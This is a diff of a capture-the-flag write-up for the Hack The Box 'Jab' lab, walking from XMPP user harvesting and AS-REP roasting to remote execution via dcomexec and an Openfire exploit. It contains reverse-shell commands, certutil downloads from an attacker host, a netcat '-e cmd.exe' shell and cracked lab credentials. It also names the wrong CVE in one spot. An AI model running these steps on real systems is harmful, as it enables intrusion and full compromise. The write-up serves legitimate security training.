@@ -15,9 +15,13 @@ Machine IP: 10.10.11.4
 
 ### Nmap
 
-sudo nmap - sC - sV - oA jab\_scan 10.10.11.4
+```
+sudo nmap - sC - sV - oA jab_scan 10.10.11.4
+```
 
-![](/src/assets/images/jab/nmap1.png)![](/src/assets/images/jab/nmap2.png)![](/src/assets/images/jab/nmap3.png)
+![](../../assets/images/jab/nmap1.png)
+![](../../assets/images/jab/nmap2.png)
+![](../../assets/images/jab/nmap3.png)
 
 We have port 53,88,135,389,445,464, 636 etc.
 
@@ -31,15 +35,15 @@ Since, we are dealing with a DC machine, I tried kerbute:
 ./kerbrute_linux_amd64 userenum --dc 10.10.11.4 -d jab.htb /usr / share / seclists / Usernames / xato - net - 10 - million - usernames.txt
 ```
 
-![](/src/assets/images/jab/ker.png)
+![](../../assets/images/jab/ker.png)
 
-We got some users but none game us hashes via AESRepRoasting. Next port that looks promising is 5222 running Jabber xmpp service. Checking this out  online. We find out that XMPP is an open standard mostly used for messaging and there are client/ server implementations. We also find out that there can be data leakage of employee names and the likes. This is what we want.
+We got some users but none gave us hashes via AESRepRoasting. Next port that looks promising is 5222 running Jabber xmpp service. Checking this out  online. We find out that XMPP is an open standard mostly used for messaging and there are client/ server implementations. We also find out that there can be data leakage of employee names and the likes. This is what we want.
 
-![https://kernal.eu/posts/xmpp-enumeration/](/src/assets/images/jab/xmpp.png "https://kernal.eu/posts/xmpp-enumeration/")
+![https://kernal.eu/posts/xmpp-enumeration/](../../assets/images/jab/xmpp.png "https://kernal.eu/posts/xmpp-enumeration/")
 
 Using this as a reference point to exploit XMPP: [https://exploit.im/index-en.html](https://exploit.im/index-en.html)
 
-![](/src/assets/images/jab/pidgin.png)
+![](../../assets/images/jab/pidgin.png)
 
 We see that we need to install pidgin client
 
@@ -49,71 +53,89 @@ sudo apt install pidgin
 
 Run pidgin using the 'pidgin' command
 
-![](/src/assets/images/jab/pid2.png)
+![](../../assets/images/jab/pid2.png)
 
 click on 'add' change protocol to xmpp. Basically follow the steps for new account creation here: [https://exploit.im/index-en.html](https://exploit.im/index-en.html)
 
 Add domain as: jab.htb. Specify a password. (Dont forget to check the 'Create new account on this server' box)
 
-![](/src/assets/images/jab/pid3.png)
+![](../../assets/images/jab/pid3.png)
 
 Go to Advanced and Add the ip address as connect server: 10.10.11.4
 
-![](/src/assets/images/jab/pid4.png)Now, we get an XMPP Client Registration page
+![](../../assets/images/jab/pid4.png)Now, we get an XMPP Client Registration page
 
-![](/src/assets/images/jab/pid5.png)After getting the registration successful prompt, we proceed to the 'Buddy List'. We click on 'Join a Chat', then 'Room List'. We get a popup to query conference.jab.htb, proceed and now we het two rooms: test and test2![](/src/assets/images/jab/pid7.png)We check these two rooms out by clicking 'Join'. We see that we can only join the "test 2" room![](/src/assets/images/jab/pid8.png)Nothing interesting here, other than the name: ﻿bdavis. Looking aroud, we see a feature that helps us search for users
+![](../../assets/images/jab/pid5.png)
+After getting the registration successful prompt, we proceed to the 'Buddy List'. We click on 'Join a Chat', then 'Room List'. We get a popup to query conference.jab.htb, proceed and now we het two rooms: test and test2![](/src/assets/images/jab/pid7.png)We check these two rooms out by clicking 'Join'. We see that we can only join the "test 2" room![](/src/assets/images/jab/pid8.png)Nothing interesting here, other than the name: ﻿bdavis. Looking aroud, we see a feature that helps us search for users
 
-![](/src/assets/images/jab/pid9.png)Click Search Directory
+![](../../assets/images/jab/pid9.png)Click Search Directory
 
-![](/src/assets/images/jab/pid10.png)Enter "\*" for wildcard query and click on OK
+![](../../assets/images/jab/pid10.png)Enter "\*" for wildcard query and click on OK
 
-![](/src/assets/images/jab/pid11.png)Now, we get a list of users as the output
+![](../../assets/images/jab/pid11.png)Now, we get a list of users as the output
 
-![](/src/assets/images/jab/pid12.png)We cant copy and paste this so we can try export the search users result to a list. To do this we need to open another instance of pidgin and send the ouput to a list:
+![](../../assets/images/jab/pid12.png)We cant copy and paste this so we can try export the search users result to a list. To do this we need to open another instance of pidgin and send the ouput to a list:
 
+````
 sudo pidgin -d > users.txt
-
+````
 CTRL C to make sure the changes are exported to the list. We have out result, but its jumbled:
 
-![](/src/assets/images/jab/pid13.png)However, we can clean this. Looking at the format, we are interested in the names between the value tag. Ex: \<value>[lmccarty@jab.htb](mailto\:lmccarty@jab.htb)\</value>
+![](../../assets/images/jab/pid13.png)However, we can clean this. Looking at the format, we are interested in the names between the value tag. Ex: \<value>[lmccarty@jab.htb](mailto\:lmccarty@jab.htb)\</value>
 
+````
 grep -o '\<value>.\*\</value>' users.txt | cut -d ">" -f 2 | cut -d "@" -f 1 | cut -d "\<" -f 1 | tee new\_users
+````
 
-![](/src/assets/images/jab/cut.png)Remove the first three lines and you're good.
+![](../../assets/images/jab/cut.png)Remove the first three lines and you're good.
 
 We can return back to AESRepRoasting, now that we have our list of certain valid users.
 
 Apparently, that didn't give us all the users. We need to  find a better way to filter users.
+Copy users manually. The users we had initally missed then redo AESREP Roast.
 
-redo AESREP Roast
-
+```
 impacket-GetNPUsers -dc-ip 10.10.11.4 jab.htb/ -usersfile users1 -outputfile hash -format john
+```
 
-Now that we have the hash, we can crack using john.![](/src/assets/images/jab/hash.png)john hash --wordlist=/usr/share/wordlists/rockyou.txt![](/src/assets/images/jab/john.png)Creds
+Now that we have the hash, we can crack using john.
+![](../../assets/images/jab/hash.png)
 
-[jmontgomery@JAB.HTB](mailto\:jmontgomery@JAB.HTB) : Midnight\_121
+```john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![](../../assets/images/jab/john.png)Creds
+
+```
+jmontgomery@JAB.HTB : Midnight\_121
+```
 
 We can use this creds on the pidgin client
 
-![](/src/assets/images/jab/mont.png)Follow through with process like we used in creating the previous accounts. Searching for rooms, we see a new room 'pentest2023'
+![](../../assets/images/jab/mont.png)
+Follow through with process like we used in creating the previous accounts. Searching for rooms, we see a new room 'pentest2023'
 
-![](/src/assets/images/jab/room.png)Looking at the conversations in the room, we see that someone had ran a GetUserSPN imapact command and has gotten the hash of the svc\_openfire service account. We also have the password that has been cracked using hashcat.
+![](../../assets/images/jab/room.png)
+Looking at the conversations in the room, we see that someone had ran a GetUserSPN imapact command and has gotten the hash of the svc_openfire service account. We also have the password that has been cracked using hashcat.
 
-![](/src/assets/images/jab/pass.png)
+![](../../assets/images/jab/pass.png)
 
-#### Low Priv Shell
+### Low Priv Shell
 
 Now that we have another set of creds, how can we get initial foothold? Going back, we have a bunch of ports, and we have a couple of MSCRPC services running. After searching we see on hacktricks that we can get RCE (with valid creds) via MSRPC service using dcomexec, which is a part of impacket tool.
 
-![](/src/assets/images/jab/rpc.png)Ref: [https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
+![](../../assets/images/jab/rpc.png)
+Ref: [https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
 
 How to use dcomexec: [https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/](https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/)
 
-impacket-dcomexec -object MMC20 jab.htb/svc\_openfire\@10.10.11.4
+```
+impacket-dcomexec -object MMC20 jab.htb/svc_openfire@10.10.11.4
+```
 
 Getting stuck here
 
-![](/src/assets/images/jab/stuck.png)We can pass a command to execute within the victim machine. I will be passwing this as a payload within the dcomexec command. To do this, I have this python script that creates a payload then encodes it in base64 format
+![](../../assets/images/jab/stuck.png)We can pass a command to execute within the victim machine. I will be passwing this as a payload within the dcomexec command. To do this, I have this python script that creates a payload then encodes it in base64 format
 
 ```python
 #!/usr/bin/env python3
@@ -147,9 +169,15 @@ print(cmdline)
 
 To run this, we need two arguments: the attacker's ip address and listeneing port:
 
+```
 python3 mkpsrevshell.py 10.10.16.63 4444
+```
 
-![](/src/assets/images/jab/python.png)Now we have a base64 encoded payload, we can pass it to our decomexec command. Remember to start a necat cat listener on port 4444 rlwrap nc -nvlp 4444
+![](../../assets/images/jab/python.png)
+Now we have a base64 encoded payload, we can pass it to our decomexec command. Remember to start a necat cat listener on port 4444 
+```
+rlwrap nc -nvlp 4444
+```
 
 dcomexec command:
 
@@ -158,7 +186,8 @@ impacket - dcomexec - object MMC20 jab.htb / svc_openfire: @10.10.11.4 'cmd.exe 
 ' -silentcommand
 ```
 
-Now we get a shell as svc\_openfire user:![](/src/assets/images/jab/shell.png)
+Now we get a shell as svc_openfire user:
+![](../../assets/images/jab/shell.png)
 
 ### Privilege Escalation
 
@@ -179,25 +208,36 @@ dir C: \Windows\System32\config\RegBack\SYSTEM
 
 Checking the service running using Get-Process, we notice the openfire-service running![](/src/assets/images/jab/openfire.png)Checking searchsploit: `searchsploit openfire`. We see a priv esc vulnerability which applies to us right now![](/src/assets/images/jab/search.png)`searchsploit -m jsp/webapps/38190.txt`
 
-To get the exploit in the current working directory. Checking the content, we have details about the exploit and how to become admin. We k![](/src/assets/images/jab/ex.png)We now know that we are dealing with CVE-2022-22733.
+To get the exploit in the current working directory. Checking the content, we have details about the exploit and how to become admin.
+![](../../assets/images/jab/ex.png)
+We now know that we are dealing with CVE-2022-22733.
 
 We need to have access to the openfire webpage from our attacker machine. To do this, we need to forward the port openfire is running on locally to us. What port does openfire run on?
 
-![](/src/assets/images/jab/port.png)We see that it typically runs on port 9090. For port forwarding, we use chisel. Transfer chisel to windows machine:
+![](../../assets/images/jab/port.png)
+We see that it typically runs on port 9090. For port forwarding, we use chisel. Transfer chisel to windows machine:
 
+```
 certutil -urlcache -f http\://\[IP]/chisel.exe chisel.exe
+```
 
 and on attacker machine:
 
+```
 ./chisel server -p 8800 --reverse
+```
 
 With the help of other articles, we discovered to open port 9091 as well. On victim machine, run the chisel client:
 
+```
  .\chisel.exe client\[IP]:8800 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091&
+```
 
-So now, we will have access to the openfire portal on port 9090![](/src/assets/images/jab/portal.png)Now we can login in with the svc\_openfire credentials. We see the admin console
+So now, we will have access to the openfire portal on port 9090
+![](../../assets/images/jab/portal.png)
+Now we can login in with the svc_openfire credentials. We see the admin console
 
-![](/src/assets/images/jab/admin.png)
+![](../../assets/images/jab/admin.png)
 
 To find out how to exploit this, we search online, this github repo has the payload we can use: [https://github.com/miko550/CVE-2023-32315](https://github.com/miko550/CVE-2023-32315)
 
@@ -205,26 +245,33 @@ Follow the steps in the repo: clone repo, upload jar file and get admin.
 
 After exploit is ran, a new user was created:
 
-![](/src/assets/images/jab/ex1.png)login with new user creds and upload jar file as plugin. Dont forget to change the csrf and session token as well
+![](../../assets/images/jab/ex1.png)
 
-![](/src/assets/images/jab/admin.png)Over here, we see that under the Description tab we wee pass 123. Now, we go to  Server > Server settings > Management Tool. You will be asked for a password, enter: 123
+login with new user creds and upload jar file as plugin. Dont forget to change the csrf and session token as well.
 
-![](/src/assets/images/jab/mgt.png)We now see some details about the server 
+If you are having difficulties, follow steps here: [https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce)
 
-![](/src/assets/images/jab/deets.png)We can choose \system command\ to run commands on the server and get interactive shell.
+![](../../assets/images/jab/admin.png)Over here, we see that under the Description tab we wee pass 123. Now, we go to  Server > Server settings > Management Tool. You will be asked for a password, enter: 123
 
-![](/src/assets/images/jab/cmd.png)
+![](../../assets/images/jab/mgt.png)We now see some details about the server 
+
+![](../../assets/images/jab/deets.png)We can choose 'system command' to run commands on the server and get interactive shell.
+
+![](../../assets/images/jab/cmd.png)
 
 Check which user we are:
 
-![](/src/assets/images/jab/NTauth.png)
+![](../../assets/images/jab/NTauth.png)
 
 To get root shell, we first upload netcat then get root shell:
 
-certutil -urlcache -f http\://\[ip]/nc.exe c:/windows/temp/nc.exe
+```
+certutil -urlcache -f http://[ip]/nc.exe c:/windows/temp/nc.exe
+c:/windows/temp/nc.exe [IP] 1234 -e cmd.exe
+```
 
-c:/windows/temp/nc.exe \[IP] 1234 -e cmd.exe
-
-![](/src/assets/images/jab/execute_shell.png)
+![](../../assets/images/jab/upload_nc.png)
+![](../../assets/images/jab/execute_shell.png)
 
 After executing this, we shell as NT auth
+![](../../assets/images/jab/root.png)
